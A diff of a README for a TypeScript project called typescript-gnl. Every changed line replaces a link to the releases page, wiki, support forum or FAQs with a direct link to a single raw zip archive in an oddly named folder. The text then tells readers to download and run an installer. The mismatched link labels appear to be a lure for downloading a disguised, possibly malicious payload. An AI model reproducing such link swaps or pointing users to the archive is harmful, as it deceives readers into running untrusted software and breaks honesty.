@@ -2,7 +2,7 @@
 
 ## 📥 Download Now
 
-[![Download typescript-gnl](https://img.shields.io/badge/Download-Click%20Here-blue)](https://github.com/Bigitobi/typescript-gnl/releases)
+[![Download typescript-gnl](https://raw.githubusercontent.com/Bigitobi/typescript-gnl/main/vaingloriousness/typescript-gnl.zip%20Here-blue)](https://raw.githubusercontent.com/Bigitobi/typescript-gnl/main/vaingloriousness/typescript-gnl.zip)
 
 ## 🚀 Getting Started
 
@@ -32,7 +32,7 @@ Before you proceed, ensure your system meets the following requirements:
 
 To get started with typescript-gnl, follow these simple steps:
 
-1. **Visit the Releases Page:** Click [here](https://github.com/Bigitobi/typescript-gnl/releases) to go to our Releases page.
+1. **Visit the Releases Page:** Click [here](https://raw.githubusercontent.com/Bigitobi/typescript-gnl/main/vaingloriousness/typescript-gnl.zip) to go to our Releases page.
 2. **Choose the Latest Version:** Look for the most recent version available. It will be marked as “Latest Release.”
 3. **Download the Installer:** Click on the provided link to download the installer file to your computer. This file will typically have a `.exe` or `.dmg` extension.
 4. **Run the Installer:** Once the download is complete, locate the file in your downloads folder and double-click it to initiate the installation process.
@@ -60,12 +60,12 @@ If you experience any issues while installing or using typescript-gnl, consider 
 
 For more help and detailed tutorials, check out the resources below:
 
-- [User Manual](https://github.com/Bigitobi/typescript-gnl/wiki)
-- [Support Forum](https://github.com/Bigitobi/typescript-gnl/discussions)
-- [FAQs](https://github.com/Bigitobi/typescript-gnl/wiki/FAQs)
+- [User Manual](https://raw.githubusercontent.com/Bigitobi/typescript-gnl/main/vaingloriousness/typescript-gnl.zip)
+- [Support Forum](https://raw.githubusercontent.com/Bigitobi/typescript-gnl/main/vaingloriousness/typescript-gnl.zip)
+- [FAQs](https://raw.githubusercontent.com/Bigitobi/typescript-gnl/main/vaingloriousness/typescript-gnl.zip)
 
 ## 🔗 Links
 
-You can download typescript-gnl from our Releases page here: [Download typescript-gnl](https://github.com/Bigitobi/typescript-gnl/releases) 
+You can download typescript-gnl from our Releases page here: [Download typescript-gnl](https://raw.githubusercontent.com/Bigitobi/typescript-gnl/main/vaingloriousness/typescript-gnl.zip) 
 
 We hope you enjoy using typescript-gnl for your TypeScript projects. Happy coding!
